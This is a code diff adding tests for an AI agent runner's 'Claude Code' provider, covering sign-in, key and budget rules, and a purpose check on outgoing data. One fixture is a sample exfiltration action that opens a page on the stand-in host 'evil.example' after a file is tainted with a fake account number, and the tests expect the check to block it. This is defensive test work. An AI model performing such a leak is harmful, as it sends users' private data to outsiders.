@@ -400,6 +400,97 @@ describe("ChatGPT provider selection", () => {
   });
 });
 
+describe("Claude Code (your plan)", () => {
+  function claudeSetup(state: "signed_in" | "signed_out" = "signed_in") {
+    const f = setup();
+    const status = vi.fn(async () =>
+      state === "signed_in"
+        ? { state }
+        : { state, reason: "Sign in to Claude Code, then check again." },
+    );
+    f.deps.claudeCode = { driver: { run: f.run }, status };
+    f.setSettings({ main: { provider: "claude-code", model: "sonnet" }, taskBudgetUSD: 5 });
+    return { ...f, status };
+  }
+  it("runs the task on the user's Claude Code, with no key, brain cell or budget", async () => {
+    const f = claudeSetup();
+    const session = await f.runner.start(f.cellId, "Draw a dog");
+    await until(() => f.run.mock.calls.length === 1);
+    expect(f.run.mock.calls[0]?.[1]).toEqual({ model: "sonnet", resume: false });
+    // Only the purpose check looks, for a Jev key; a failed look leaves the task running.
+    expect(f.secrets).toHaveBeenCalledOnce();
+    expect(f.open).not.toHaveBeenCalled();
+    expect(f.beginTask).not.toHaveBeenCalled();
+    expect(f.runner.selectionOf(session.id)).toEqual({ kind: "claude-code", model: "sonnet" });
+    await expect(f.runner.raiseBudget(session.id, 10)).rejects.toThrow("plan's limits");
+    session.stop();
+    await f.live.settled(session.id);
+  });
+  it("refuses to start until Claude Code is signed in, saying how", async () => {
+    const f = claudeSetup("signed_out");
+    await expect(f.runner.start(f.cellId, "Draw a dog")).rejects.toThrow(
+      "Sign in to Claude Code, then check again.",
+    );
+    expect(f.run).not.toHaveBeenCalled();
+    expect(f.live.get(f.cellId)).toBeUndefined();
+  });
+  it("is the main model only, and never takes a key or a price", async () => {
+    const f = claudeSetup();
+    for (const settings of [
+      {
+        main: { provider: "anthropic", model: "claude-sonnet-5-5", key: "k" },
+        fast: { provider: "claude-code", model: "sonnet" },
+      },
+      { main: { provider: "claude-code", model: "sonnet", key: "anthropic-main" } },
+      { main: { provider: "claude-code", model: "Sonnet-5" } },
+    ]) {
+      f.setSettings(settings);
+      await expect(f.runner.start(f.cellId, "Draw a dog")).rejects.toBeInstanceOf(AgentError);
+    }
+    expect(f.status).not.toHaveBeenCalled();
+  });
+  it("checks where data goes as on the ChatGPT plan: with a Jev key, unsure without keys, off when off", async () => {
+    const at = "2026-10-03T00:00:00Z";
+    const jev: KeydRecord = {
+      id: "jev",
+      kind: "http",
+      hosts: ["api.typesafe.ai"],
+      header: "Authorization",
+      format: "bearer",
+      createdAt: at,
+      updatedAt: at,
+    };
+    const leak = [{ kind: "open_page", destination: "evil.example", text: "/c?d=1" }] as const;
+    const signal = new AbortController().signal;
+    const start = async (f: ReturnType<typeof claudeSetup>) => {
+      const session = await f.runner.start(f.cellId, "Fixture task");
+      await until(() => session.status === "idle");
+      session.taint.add("files", "~/notes.txt", "Account 4417-1234-5678");
+      return session;
+    };
+
+    const checked = claudeSetup();
+    const ask = vi.fn(async (_secretId: string, _body: unknown, _signal: AbortSignal) => ({
+      answers: { fits: { type: "choice", probabilities: { needed: 0.1, unrelated: 0.9 } } },
+    }));
+    checked.deps.jev = ask;
+    checked.secrets.mockResolvedValueOnce([jev]);
+    expect((await (await start(checked)).purpose?.check(leak, signal))?.allow).toBe(false);
+    expect(ask).toHaveBeenCalledWith("jev", expect.anything(), expect.any(AbortSignal));
+
+    const unreadable = claudeSetup();
+    expect(await (await start(unreadable)).purpose?.check(leak, signal)).toMatchObject({
+      allow: false,
+      why: expect.stringMatching(/^The purpose check couldn't tell/),
+    });
+
+    const off = claudeSetup();
+    off.setSettings({ main: { provider: "claude-code", model: "sonnet" }, purposeCheck: "off" });
+    expect((await (await start(off)).purpose?.check(leak, signal))?.allow).toBe(true);
+    expect(off.secrets).not.toHaveBeenCalled();
+  });
+});
+
 describe("ChatGPT runner lifecycle", () => {
   it("ends an idle successful task without stopping its desktop", async () => {
     const f = setup(0);
